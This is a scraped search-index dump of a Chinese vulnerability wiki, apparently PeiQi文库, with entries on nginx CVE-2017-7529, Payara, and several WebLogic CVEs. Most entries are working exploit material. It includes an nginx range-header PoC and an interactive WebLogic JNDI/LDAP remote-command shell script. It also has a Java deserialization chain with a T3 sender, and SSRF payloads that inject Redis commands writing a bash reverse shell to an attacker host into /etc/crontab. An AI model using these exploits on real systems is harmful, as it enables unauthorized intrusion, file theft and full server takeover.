","date":"0001-01-01","objectID":"/nginx%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E-cve-2017-7529/:2:0","tags":null,"title":"","uri":"/nginx%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E-cve-2017-7529/"},{"categories":null,"content":"环境搭建 git clone https://github.com/vulhub/vulhub.git cd vulhub/nginx/CVE-2017-7529 docker-compose up -d 访问 http://xxx.xxx.xxx.xxx:8080 正常即可 ","date":"0001-01-01","objectID":"/nginx%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E-cve-2017-7529/:3:0","tags":null,"title":"","uri":"/nginx%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E-cve-2017-7529/"},{"categories":null,"content":"漏洞复现 使用目录下的POC进行验证 python poc.py http://xxx.xxx.xxx.xxx:8080/ ","date":"0001-01-01","objectID":"/nginx%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E-cve-2017-7529/:4:0","tags":null,"title":"","uri":"/nginx%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E-cve-2017-7529/"},{"categories":null,"content":"漏洞POC #!/usr/bin/env python import sys import requests if len(sys.argv) \u003c 2: print(\"%s url\" % (sys.argv[0])) print(\"eg: python %s http://your-ip:8080/\" % (sys.argv[0])) sys.exit() headers = { 'User-Agent': \"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240\" } offset = 605 url = sys.argv[1] file_len = len(requests.get(url, headers=headers).content) n = file_len + offset headers['Range'] = \"bytes=-%d,-%d\" % ( n, 0x8000000000000000 - n) r = requests.get(url, headers=headers) ","date":"0001-01-01","objectID":"/nginx%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E-cve-2017-7529/:5:0","tags":null,"title":"","uri":"/nginx%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E-cve-2017-7529/"},{"categories":null,"content":"PayaraMicro microprofile-config.properties 信息泄漏漏洞 CVE-2021-41381 ","date":"0001-01-01","objectID":"/payaramicro-microprofile-config.properties-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2021-41381/:0:0","tags":null,"title":"","uri":"/payaramicro-microprofile-config.properties-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2021-41381/"},{"categories":null,"content":"漏洞描述 PayaraMicro microprofile-config.properties文件配置错误的情况下可被任意用户读取，获取敏感信息 ","date":"0001-01-01","objectID":"/payaramicro-microprofile-config.properties-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2021-41381/:1:0","tags":null,"title":"","uri":"/payaramicro-microprofile-config.properties-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2021-41381/"},{"categories":null,"content":"漏洞影响 Payara Micro Community 5.2021.6 ","date":"0001-01-01","objectID":"/payaramicro-microprofile-config.properties-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2021-41381/:2:0","tags":null,"title":"","uri":"/payaramicro-microprofile-config.properties-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2021-41381/"},{"categories":null,"content":"网络测绘 app=\"Payara-Micro\" ","date":"0001-01-01","objectID":"/payaramicro-microprofile-config.properties-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2021-41381/:3:0","tags":null,"title":"","uri":"/payaramicro-microprofile-config.properties-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2021-41381/"},{"categories":null,"content":"漏洞复现 产品页面 验证POC /.//WEB-INF/classes/META-INF/microprofile-config.properties ","date":"0001-01-01","objectID":"/payaramicro-microprofile-config.properties-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2021-41381/:4:0","tags":null,"title":"","uri":"/payaramicro-microprofile-config.properties-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2021-41381/"},{"categories":null,"content":"Weblogic LDAP 远程代码执行漏洞 CVE-2021-2109 ","date":"0001-01-01","objectID":"/weblogic-ldap-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-2109/:0:0","tags":null,"title":"","uri":"/weblogic-ldap-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-2109/"},{"categories":null,"content":"漏洞描述 2021年1月20日，绿盟科技监测发现Oracle官方发布了2021年1月关键补丁更新公告CPU（Critical Patch Update），共修复了329个不同程度的漏洞，其中包括7个影响WebLogic的严重漏洞（CVE-2021-1994、CVE-2021-2047、CVE-2021-2064、CVE-2021-2108、CVE-2021-2075、CVE-2019-17195、CVE-2020-14756），未经身份验证的攻击者可通过此次的漏洞实现远程代码执行。CVSS评分均为9.8，利用复杂度低。建议用户尽快采取措施，对上述漏洞进行防护。 ","date":"0001-01-01","objectID":"/weblogic-ldap-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-2109/:1:0","tags":null,"title":"","uri":"/weblogic-ldap-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-2109/"},{"categories":null,"content":"漏洞影响 WebLogic Server 10.3.6.0.0 WebLogic Server 12.1.3.0.0 WebLogic Server 12.2.1.3.0 WebLogic Server 12.2.1.4.0 WebLogic Server 14.1.1.0.0 ","date":"0001-01-01","objectID":"/weblogic-ldap-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-2109/:2:0","tags":null,"title":"","uri":"/weblogic-ldap-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-2109/"},{"categories":null,"content":"环境搭建 git clone https://github.com/vulhub/vulhub.git cd vulhub/weblogic/CVE-2020-14882 docker-compose up -d 访问 http://xxx.xxx.xxx.xxx:7001 正常即可 ","date":"0001-01-01","objectID":"/weblogic-ldap-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-2109/:3:0","tags":null,"title":"","uri":"/weblogic-ldap-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-2109/"},{"categories":null,"content":"漏洞复现 访问一下URL http://xxx.xxx.xxx.xxx:7001/console/css/%2e%2e%2f/consolejndi.portal 如果有此页面未授权可访问，且在影响范围内则可能出现漏洞 下载漏洞攻击需要的 LDAP启动脚本 下载链接 下载到服务器上启动 java -jar JNDIExploit-v1.11.jar -i xxx.xxx.xxx.xxx (服务器地址) 部分服务器注意放行端口 然后配合 Weblogic未授权范围 命令执行 /console/css/%252e%252e/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral\u0026_nfpb=true\u0026JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://xxx.xxx.xxx;xxx:1389/Basic/WeblogicEcho;AdminServer%22) 注意 ldap://xxx.xxx.xxx;xxx:1389/Basic/WeblogicEcho 这里 LDAP服务器地址第三个分隔符号为 ; 登录后台可使用此POC，未授权的话用上面的 /console/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral\u0026_nfpb=true\u0026JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://xxx.xxx.xxx;xxx:1389/Basic/WeblogicEcho;AdminServer%22) ","date":"0001-01-01","objectID":"/weblogic-ldap-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-2109/:4:0","tags":null,"title":"","uri":"/weblogic-ldap-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-2109/"},{"categories":null,"content":"漏洞POC 注意参数格式 Ldap »\u003e ldap://xxx.xxx.xxx;xxx:1389 中的分号 如果使用其他的利用Ldap服务请自行更改 POC关键字 此POC仅仅检验有未授权的情况 import requests import sys import re requests.packages.urllib3.disable_warnings() from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: Weblogic 多个版本 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mLDAP \u003e\u003e\u003e ldap://xxx.xxx.xxx;xxx:1389 \\033[0m') print('+------------------------------------------') def POC_1(target_url, ldap_url, cmd): vuln_url = target_url + \"/console/css/%252e%252e/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral\u0026_nfpb=true\u0026JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22{}/Basic/WeblogicEcho;AdminServer%22)\".format(ldap_url) print('\\033[36m[o] 正在请求: {}'.format(vuln_url)) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"cmd\": cmd } try: response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) if \"root:\" in response.text: print(\"\\033[32m[o] 目标{}存在漏洞 \\033[0m\".format(target_url)) print(\"\\033[32m[o] 响应为:\\n{} \\033[0m\".format(response.text)) else: print(\"\\033[31m[x] 命令执行失败 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请检查参数和Ldap服务是否正确 \\033[0m\", e) def POC_2(target_url, ldap_url, cmd): vuln_url = target_url + \"/console/css/%252e%252e/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral\u0026_nfpb=true\u0026JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22{}/Basic/WeblogicEcho;AdminServer%22)\".format(ldap_url) print('\\033[36m[o] 正在请求: {}'.format(vuln_url)) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"cmd\": cmd } try: response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[32m[o] 响应为:\\n{} \\033[0m\".format(response)) except Exception as e: print(\"\\033[31m[x] 请检查参数和Ldap服务是否正确 \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e\u003e\u003e \\033[0m\")) ldap_url = str(input(\"\\033[35mLdap \u003e\u003e\u003e \\033[0m\")) POC_1(target_url, ldap_url, cmd=\"cat /etc/passwd\") while True: cmd = input(\"\\033[35mCmd \u003e\u003e\u003e \\033[0m\") if cmd == \"exit\": sys.exit(0) else: POC_2(target_url, ldap_url, cmd) ","date":"0001-01-01","objectID":"/weblogic-ldap-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-2109/:5:0","tags":null,"title":"","uri":"/weblogic-ldap-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-2109/"},{"categories":null,"content":"WebLogic Local File Inclusion 本地文件包含漏洞 CVE-2022-21371 ","date":"0001-01-01","objectID":"/weblogic-local-file-inclusion-%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-cve-2022-21371/:0:0","tags":null,"title":"","uri":"/weblogic-local-file-inclusion-%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-cve-2022-21371/"},{"categories":null,"content":"漏洞描述 2022年1月19日，绿盟科技CERT监测发现Oracle官方发布了1月关键补丁更新公告CPU（Critical Patch Update），此次共修复了497个不同程度的漏洞，此次安全更新涉及Oracle WebLogic Server、Oracle MySQL、Oracle Java SE、Oracle FusionMiddleware、Oracle Retail Applications等多个常用产品。Oracle强烈建议客户尽快应用关键补丁更新修复程序，对漏洞进行修复。 ","date":"0001-01-01","objectID":"/weblogic-local-file-inclusion-%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-cve-2022-21371/:1:0","tags":null,"title":"","uri":"/weblogic-local-file-inclusion-%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-cve-2022-21371/"},{"categories":null,"content":"漏洞影响 WebLogic Server 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0 and 14.1.1.0.0 ","date":"0001-01-01","objectID":"/weblogic-local-file-inclusion-%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-cve-2022-21371/:2:0","tags":null,"title":"","uri":"/weblogic-local-file-inclusion-%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-cve-2022-21371/"},{"categories":null,"content":"漏洞复现 验证POC .//META-INF/MANIFEST.MF .//WEB-INF/web.xml .//WEB-INF/portlet.xml .//WEB-INF/weblogic.xml ","date":"0001-01-01","objectID":"/weblogic-local-file-inclusion-%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-cve-2022-21371/:3:0","tags":null,"title":"","uri":"/weblogic-local-file-inclusion-%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-cve-2022-21371/"},{"categories":null,"content":"Weblogic Server 远程代码执行漏洞 CVE-2020-14756 ","date":"0001-01-01","objectID":"/weblogic-server%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-14756/:0:0","tags":null,"title":"","uri":"/weblogic-server%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-14756/"},{"categories":null,"content":"漏洞描述 weblogic的T3协议反序列化漏洞一直是一个比较热门也比较好用的漏洞，weblogic针对该漏洞的解决方案就是不断填充黑名单，在高版本jdk下配合jep290机制实现黑名单，在低版本下配合resolveClass进行防御，所以安全人员对于T3反序列化的利用也是一直在寻找黑名单之外的利用链。 CVE-2020-14756 这个漏洞的利用比较巧妙，通过利用weblogic coherence组件中的类，绕过了黑名单机制的检测，重新能够利用黑名单中的类，造成代码执行。 参考链接： https://www.oracle.com/security-alerts/cpujan2021.html#AppendixFMW https://github.com/Y4er/CVE-2020-14756 ","date":"0001-01-01","objectID":"/weblogic-server%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-14756/:1:0","tags":null,"title":"","uri":"/weblogic-server%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-14756/"},{"categories":null,"content":"漏洞影响 Oracle Weblogic Server 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0 ","date":"0001-01-01","objectID":"/weblogic-server%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-14756/:2:0","tags":null,"title":"","uri":"/weblogic-server%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-14756/"},{"categories":null,"content":"漏洞复现 CVE_2020_14756.java： package com.supeream; import com.supeream.serial.Serializables; import com.supeream.weblogic.T3ProtocolOperation; // coherence-rest.jar import com.tangosol.coherence.rest.util.extractor.MvelExtractor; // coherence-web.jar import com.tangosol.coherence.servlet.AttributeHolder; // coherence.jar import com.tangosol.util.SortedBag; import com.tangosol.util.aggregator.TopNAggregator; import java.io.File; import java.io.FileOutputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.lang.reflect.Method; public class CVE_2020_14756 { public static void main(String[] args) { MvelExtractor extractor = new MvelExtractor(\"java.lang.Runtime.getRuntime().exec(\\\"calc\\\");\"); MvelExtractor extractor2 = new MvelExtractor(\"\"); try { SortedBag sortedBag = new TopNAggregator.PartialResult(extractor2, 2); AttributeHolder attributeHolder = new AttributeHolder(); sortedBag.add(1); Field m_comparator = sortedBag.getClass().getSuperclass().getDeclaredField(\"m_comparator\"); m_comparator.setAccessible(true); m_comparator.set(sortedBag, extractor); Method setInternalValue = attributeHolder.getClass().getDeclaredMethod(\"setInternalValue\", Object.class); setInternalValue.setAccessible(true); setInternalValue.invoke(attributeHolder, sortedBag); /* FileOutputStream fileOutputStream = new FileOutputStream(new File(\"test.ser\")); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(attributeHolder); */ T3ProtocolOperation.send(\"192.168.65.128\", \"7001\", Serializables.serialize(attributeHolder)); } catch (Exception e) { e.printStackTrace(); } } } weblogic_t3.py： #!/usr/bin/python import socket import os import sys import struct if len(sys.argv) \u003c 3: print 'Usage: python %s \u003chost\u003e \u003cport\u003e \u003c/path/to/payload\u003e' % os.path.basename(sys.argv[0]) sys.exit() sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.settimeout(5) server_address = (sys.argv[1], int(sys.argv[2])) print '[+] Connecting to %s port %s' % server_address sock.connect(server_address) # Send headers headers='t3 12.2.1\\nAS:255\\nHL:19\\nMS:10000000\\nPU:t3://us-l-breens:7001\\n\\n' print 'sending \"%s\"' % headers sock.sendall(headers) data = sock.recv(1024) print \u003e\u003esys.stderr, 'received \"%s\"' % data payloadObj = open(sys.argv[3],'rb').read() payload='\\x00\\x00\\x09\\xf3\\x01\\x65\\x01\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x71\\x00\\x00\\xea\\x60\\x00\\x00\\x00\\x18\\x43\\x2e\\xc6\\xa2\\xa6\\x39\\x85\\xb5\\xaf\\x7d\\x63\\xe6\\x43\\x83\\xf4\\x2a\\x6d\\x92\\xc9\\xe9\\xaf\\x0f\\x94\\x72\\x02\\x79\\x73\\x72\\x00\\x78\\x72\\x01\\x78\\x72\\x02\\x78\\x70\\x00\\x00\\x00\\x0c\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x70\\x70\\x70\\x70\\x70\\x70\\x00\\x00\\x00\\x0c\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x70\\x06\\xfe\\x01\\x00\\x00\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x1d\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x72\\x6a\\x76\\x6d\\x2e\\x43\\x6c\\x61\\x73\\x73\\x54\\x61\\x62\\x6c\\x65\\x45\\x6e\\x74\\x72\\x79\\x2f\\x52\\x65\\x81\\x57\\xf4\\xf9\\xed\\x0c\\x00\\x00\\x78\\x70\\x72\\x00\\x24\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x2e\\x69\\x6e\\x74\\x65\\x72\\x6e\\x61\\x6c\\x2e\\x50\\x61\\x63\\x6b\\x61\\x67\\x65\\x49\\x6e\\x66\\x6f\\xe6\\xf7\\x23\\xe7\\xb8\\xae\\x1e\\xc9\\x02\\x00\\x09\\x49\\x00\\x05\\x6d\\x61\\x6a\\x6f\\x72\\x49\\x00\\x05\\x6d\\x69\\x6e\\x6f\\x72\\x49\\x00\\x0b\\x70\\x61\\x74\\x63\\x68\\x55\\x70\\x64\\x61\\x74\\x65\\x49\\x00\\x0c\\x72\\x6f\\x6c\\x6c\\x69\\x6e\\x67\\x50\\x61\\x74\\x63\\x68\\x49\\x00\\x0b\\x73\\x65\\x72\\x76\\x69\\x63\\x65\\x50\\x61\\x63\\x6b\\x5a\\x00\\x0e\\x74\\x65\\x6d\\x70\\x6f\\x72\\x61\\x72\\x79\\x50\\x61\\x74\\x63\\x68\\x4c\\x00\\x09\\x69\\x6d\\x70\\x6c\\x54\\x69\\x74\\x6c\\x65\\x74\\x00\\x12\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\x4c\\x00\\x0a\\x69\\x6d\\x70\\x6c\\x56\\x65\\x6e\\x64\\x6f\\x72\\x71\\x00\\x7e\\x00\\x03\\x4c\\x00\\x0b\\x69\\x6d\\x70\\x6c\\x56\\x65\\x72\\x73\\x69\\x6f\\x6e\\x71\\x00\\x7e\\x00\\x03\\x78\\x70\\x77\\x02\\x00\\x00\\x78\\xfe\\x01\\x00\\x00' payload=payload+payloadObj payload=payload+'\\xfe\\x01\\x00\\x00\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x1d\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x72\\x6a\\x76\\x6d\\x2e\\x43\\x6c\\x61\\x73\\","date":"0001-01-01","objectID":"/weblogic-server%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-14756/:3:0","tags":null,"title":"","uri":"/weblogic-server%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-14756/"},{"categories":null,"content":"Weblogic SSRF漏洞 CVE-2014-4210 ","date":"0001-01-01","objectID":"/weblogic-ssrf%E6%BC%8F%E6%B4%9E-cve-2014-4210/:0:0","tags":null,"title":"","uri":"/weblogic-ssrf%E6%BC%8F%E6%B4%9E-cve-2014-4210/"},{"categories":null,"content":"漏洞描述 Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件，此漏洞可通过HTTP协议利用，未经身份验证的远程攻击者可利用此漏洞影响受影响组件的机密性 ","date":"0001-01-01","objectID":"/weblogic-ssrf%E6%BC%8F%E6%B4%9E-cve-2014-4210/:1:0","tags":null,"title":"","uri":"/weblogic-ssrf%E6%BC%8F%E6%B4%9E-cve-2014-4210/"},{"categories":null,"content":"漏洞影响 Oracle WebLogic Server 10.0.2.0 Oracle WebLogic Server 10.3.6.0 ","date":"0001-01-01","objectID":"/weblogic-ssrf%E6%BC%8F%E6%B4%9E-cve-2014-4210/:2:0","tags":null,"title":"","uri":"/weblogic-ssrf%E6%BC%8F%E6%B4%9E-cve-2014-4210/"},{"categories":null,"content":"环境搭建 git clone https://github.com/vulhub/vulhub.git cd vulhub/weblogic/ssrd docker-compose up -d 访问 http://xxx.xxx.xxx.xxx:7001 正常即可 ","date":"0001-01-01","objectID":"/weblogic-ssrf%E6%BC%8F%E6%B4%9E-cve-2014-4210/:3:0","tags":null,"title":"","uri":"/weblogic-ssrf%E6%BC%8F%E6%B4%9E-cve-2014-4210/"},{"categories":null,"content":"漏洞复现 出现漏洞的 URL为 : http://xxx.xxx.xxx.xxx:7001/uddiexplorer/SearchPublicRegistries.jsp 使用 payload 进行探测, 将探测的位置写在 operator参数中 注意需要知道内网 IP http://xxx.xxx.xxx.xxx:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name\u0026txtSearchname=sdf\u0026txtSearchkey=\u0026txtSearchfor=\u0026selfor=Business+location\u0026btnSubmit=Search\u0026operator=http://xxx.xxx.xxx.xxx:7001 通过查看报错内容来进行判断 存在的报错内容如图，关键字为 404, 例如把 operator 参数改成 http://xxx.xxx.xxx.xxx:7000 这样不存在的则报错内容如下图 通过这样的方法就可以探测内网的开放端口情况，例如内网中有一台主机 IP：172.19.0.2 开启了 6379端口的redis服务 如果访问的非http协议，则会返回did not have a valid SOAP content-type，这样通过错误的不同，即可探测内网状态。 Weblogic的SSRF有一个比较大的特点，其虽然是一个“GET”请求，但是我们可以通过传入%0a%0d来注入换行符，而某些服务（如redis）是通过换行符来分隔每条命令，也就说我们可以通过该SSRF攻击内网中的redis服务器。 发送三条redis命令，将弹shell脚本写入**/etc/crontab** 中： set 1 \"\\n\\n\\n\\n* * * * * root bash -i \u003e\u0026 /dev/tcp/xxx.xxx.xxx.xxx/9999 0\u003e\u00261\\n\\n\\n\\n\" config set dir /etc/ config set dbfilename crontab save 接着再将请求进行 url编码, 注意，换行符是“\\r\\n”，也就是“%0D%0A” test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fxxx.xxx.xxx.xxx%2F9999%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa 发送payload http://xxx.xxx.xxx.xxx:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name\u0026txtSearchname=sdf\u0026txtSearchkey=\u0026txtSearchfor=\u0026selfor=Business+location\u0026btnSubmit=Search\u0026operator=http://172.19.0.2:6379/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.19.0.3%2F9999%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa 发送后监听 172.19.0.3 9999端口 等待反弹shell 最后补充一下，可进行利用的cron有如下几个地方： /etc/crontab 这个是肯定的 /etc/cron.d/* 将任意文件写到该目录下，效果和crontab相同，格式也要和/etc/crontab相同。漏洞利用这个目录，可以做到不覆盖任何其他文件的情况进行弹shell。 /var/spool/cron/root centos系统下root用户的cron文件 /var/spool/cron/crontabs/root debian系统下root用户的cron文件 ","date":"0001-01-01","objectID":"/weblogic-ssrf%E6%BC%8F%E6%B4%9E-cve-2014-4210/:4:0","tags":null,"title":"","uri":"/weblogic-ssrf%E6%BC%8F%E6%B4%9E-cve-2014-4210/"},{"categories":null,"content":"漏洞POC GitHub脚本 CVE-2014-4210+Redis未授权访问 存活扫描: python SSRFX.py --url http://example.com/uddiexplorer/SearchPublicRegistries.jsp --app weblogic --network 172.16.5.0/24 --type livedetect 端口扫描: python SSRFX.py --url http://example.com/uddiexplorer/SearchPublicRegistries.jsp --app weblogic --network 172.16.5.0/24 --type portscan ","date":"0001-01-01","objectID":"/weblogic-ssrf%E6%BC%8F%E6%B4%9E-cve-2014-4210/:5:0","tags":null,"title":"","uri":"/weblogic-ssrf%E6%BC%8F%E6%B4%9E-cve-2014-4210/"},{"categories":null,"content":"WebLogic T3 反序列化漏洞 CVE-2016-3510 ","date":"0001-01-01","objectID":"/weblogic-t3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2016-3510/:0:0","tags":null,"title":"","uri":"/weblogic-t3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2016-3510/"},{"categories":null,"content":"漏洞描述 CVE-2016-3510漏洞是对CVE-2015-4852漏洞修复的绕过，攻击者在可以通过该漏洞实现远程命令执行。 